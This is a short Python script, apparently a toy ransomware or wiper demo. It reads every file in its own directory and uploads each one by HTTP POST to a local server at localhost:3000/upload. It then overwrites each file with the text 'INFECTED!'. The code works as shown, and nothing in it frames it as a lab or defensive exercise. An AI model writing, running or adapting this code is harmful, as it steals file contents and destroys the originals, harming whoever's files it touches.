import os
import requests

dir_path = os.path.dirname(os.path.realpath(__file__))
self_name = os.path.realpath(__file__)[len(os.path.dirname(os.path.realpath(__file__)))+1:] 

def search_and_upload(path):  
    filelist = os.listdir(path) 
    for filename in filelist:
        if os.path.isdir(path+"/"+filename):  
            pass  
        elif filename != self_name:
            file = open(path+"/"+filename, "rb")
            upload_url = "http://localhost:3000/upload"
            files = {'file': (filename, file)}
            res = requests.post(upload_url, files=files)
            print(res)
            file.close()
            file = open(path+"/"+filename, "w") 
            file.write("INFECTED!") 
            file.close()

search_and_upload(dir_path)
